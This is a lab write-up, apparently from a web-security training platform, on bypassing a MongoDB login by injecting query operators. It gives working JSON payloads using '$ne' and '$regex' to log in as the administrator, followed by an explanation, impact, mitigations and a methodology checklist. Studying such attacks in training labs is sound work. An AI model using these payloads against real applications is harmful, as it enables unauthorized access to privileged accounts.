# Lab 02 – Exploiting NoSQL Operator Injection to Bypass Authentication

## Lab Overview

**Objective**

Exploit MongoDB operator injection to authenticate as the administrator user.

The login functionality processes MongoDB operators supplied through user input.

---

# Vulnerability

The application accepts MongoDB operators within the JSON login request.

An attacker can manipulate query conditions to bypass authentication.

---

# Reconnaissance

1. Log in using:

```text
wiener:peter
```

2. Intercept the POST request.

3. Send it to **Burp Repeater**.

Original request:

```json
{
  "username":"wiener",
  "password":"peter"
}
```

---

# Exploitation

### Step 1 – Test the Username

Replace:

```json
"username":"wiener"
```

with:

```json
"username":{"$ne":""}
```

The application logs in successfully.

---

### Step 2 – Test Regular Expressions

Replace the username with:

```json
"username":{"$regex":"wien.*"}
```

Authentication succeeds again.

---

### Step 3 – Test Both Parameters

Replace the password with:

```json
"password":{"$ne":""}
```

The query now matches multiple users.

---

### Step 4 – Target the Administrator

Replace the username with:

```json
"username":{"$regex":"admin.*"}
```

Keep:

```json
"password":{"$ne":""}
```

Submit the request.

---

# Successful Result

The application authenticates as the **administrator** user.

---

# Why It Works

MongoDB evaluates the injected operators rather than treating them as literal strings.

The `$regex` operator selects administrator accounts while `$ne` bypasses password verification.

---

# Impact

Successful exploitation allows attackers to bypass authentication and access privileged accounts.

---

# Mitigation

- Reject unexpected query operators.
- Validate JSON input.
- Use parameterized queries.

---

# Bug Bounty Methodology

1. Test operator injection.
2. Confirm `$ne` processing.
3. Test `$regex`.
4. Combine operators.
5. Authenticate as a privileged account.

---

# Key Learnings

- MongoDB operators can manipulate authentication queries.
- `$ne` and `$regex` are effective for authentication bypass when improperly validated.